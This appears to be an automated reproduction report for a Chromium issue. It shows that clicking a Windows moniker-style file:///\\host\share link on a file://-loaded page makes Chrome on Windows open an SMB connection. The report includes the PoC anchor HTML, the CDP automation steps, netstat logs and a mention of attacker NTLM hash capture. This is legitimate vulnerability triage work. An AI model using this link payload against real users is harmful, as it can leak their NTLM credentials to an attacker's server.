# Issue 325707095__d75fad8179

**Bucket:** REPRODUCED

## Summary
Clicking a `file:///\\127.0.0.1\poc\!poc.txt` moniker link from a page loaded via `file://` in Google Chrome on Windows causes Chrome to make an SMB connection to the host in the link (TCP 127.0.0.1:445), matching the issue's claimed observable. The connection was observed only when the link was clicked, never on page load.

## Environment
- OS/runtime: Windows 10 (10.0.26200 x64), PowerShell 7, Node v24.13.1, Python 3.14.2
- Browser: `C:\Program Files\Google\Chrome\Application\chrome.exe`, Chrome 151.0.7922.174 (read from CDP `http://127.0.0.1:9222/json/version` → `"Browser": "Chrome/151.0.7922.174"`)
- Automation path: CDP over `--remote-debugging-port=9222`, fresh isolated profile at `artifacts\reproduction\repro\issue_325707095__d75fad8179\profile`; driven by Node WebSocket CDP client
- Required environment (per issue): Google Chrome on Windows, victim page hosted and opened via `file:///C:/exploit.html`, attacker SMB server (here the local Windows SMB server on 127.0.0.1:445 acted as the target server)
- Attachments used: none

## Reproduction

### Steps executed
1. Kill pre-existing Chrome to guarantee the isolated `--user-data-dir` is honored.
   - cmd: `Get-Process chrome -EA SilentlyContinue | Stop-Process -Force; Start-Sleep 2; if(-not(Get-Process chrome -EA SilentlyContinue)){"clean"}`
   - verify: output `clean`
2. Create the malicious HTML exactly as described in the issue (anchor href `file:///\\127.0.0.1\poc\!poc.txt`).
   - cmd: wrote `artifacts\reproduction\repro\issue_325707095__d75fad8179\exploit.html`
   - verify: file exists, 237 bytes; content sanity check shows `<a href="file:///\\127.0.0.1\poc\!poc.txt">Click Me</a>`
3. Launch Chrome with isolated profile and CDP port 9222.
   - cmd: `Start-Process chrome "--user-data-dir=<profile> --remote-debugging-port=9222 --no-first-run --no-default-browser-check about:blank"`
   - verify: `Invoke-RestMethod http://127.0.0.1:9222/json/version` returned `Browser: Chrome/151.0.7922.174`, `Protocol-Version: 1.3`
4. Start a continuous sampler of TCP connections to 127.0.0.1:445 (SMB) logging every 100 ms to `netstat_445.log`.
   - cmd: PowerShell loop `netstat -ano | Select-String "127\.0\.0\.1:445"` (excluding the server LISTEN lines), timestamped, appended to log
   - verify: log file created; `LINES=142` after first run; server listener lines excluded
5. Navigate the tab to the PoC page via `file://` and read back the page state.
   - cmd: CDP `Page.navigate` to `file:///D:/.../exploit.html`, then `Runtime.evaluate`
   - verify: page loaded; anchor href read back as `file:///\\127.0.0.1\poc\!poc.txt`
6. Control phase A — reload the PoC page and wait 4 seconds WITHOUT clicking.
   - cmd: CDP `Page.navigate` to `file:///.../exploit.html`, wait 4 s
   - verify: `A_LOADED="file:///D:/.../exploit.html|file:///\\\\127.0.0.1\\poc\\!poc.txt"`; sampler log shows ZERO connections to 127.0.0.1:445 between marker `=====AB RUN 00:00:18.902=====` and `00:00:27.786` (page load alone triggers no SMB traffic)
7. Click the "Click Me" link via CDP `Runtime.evaluate` (`document.querySelector('a').click()`).
   - cmd: `Runtime.evaluate` expression `(function(){ document.querySelector('a').click(); return 'clicked'; })()`
   - verify: returned `"clicked"` at 00:00:27.758
8. Observe the SMB connection to the attacker-specified server.
   - cmd: read `netstat_445.log`
   - verify: `00:00:27.786  TCP  127.0.0.1:445  127.0.0.1:63656  ESTABLISHED  4` — TCP connection to SMB port 445 established 28 ms after the click, held `ESTABLISHED` continuously for ~10.7 s (last sample `00:00:38.462`), then closed. First run showed the same pattern (ephemeral port 58297, 23:59:42.518 → 23:59:53.160)
9. Read back the navigation result through CDP.
   - cmd: `Runtime.evaluate` on `location.href`; `cdp_events.json` inspection
   - verify: tab URL became `chrome-error://chromewebdata/` with `"unreachableUrl": "file://127.0.0.1/poc/!poc.txt"` — Chrome canonicalized the moniker link `file:///\\127.0.0.1\poc\!poc.txt` to the UNC file URL `file://127.0.0.1/poc/!poc.txt`, attempted it, and failed only because no share named `poc` exists on the target server

## Notes
- The issue's observable — "Google Chrome processes the moniker link and inadvertently sends an SMB request to the specified server" — was verified: a TCP connection to 127.0.0.1:445 (SMB) is established within ~30 ms of clicking the link and only when the link is clicked (control phase A showed zero connections on plain page load).
- NTLM hash capture itself could not be demonstrated: port 445 is owned by the local Windows SMB server (LanmanServer, PID 4) and this session has no admin rights, so an attacker-controlled `smbserver.py` could not bind the port. Per the criteria edge case (exfiltration capture blocked but browser behavior verified), this is an exfil-capture limitation, not a reproduction failure.
- The Chromium developer's comment ("only working because you've already loaded the page from a file:// scheme") is consistent with this result: the SMB-triggering navigation occurs from a `file://`-origin page, exactly the issue's setup; the check still holds on Chrome 151.
- Timeline note: sampler clock is local time; CDP ISO timestamps are UTC (16:00:27Z = 00:00:27 local). Both runs (initial and A/B) produced identical connection patterns.
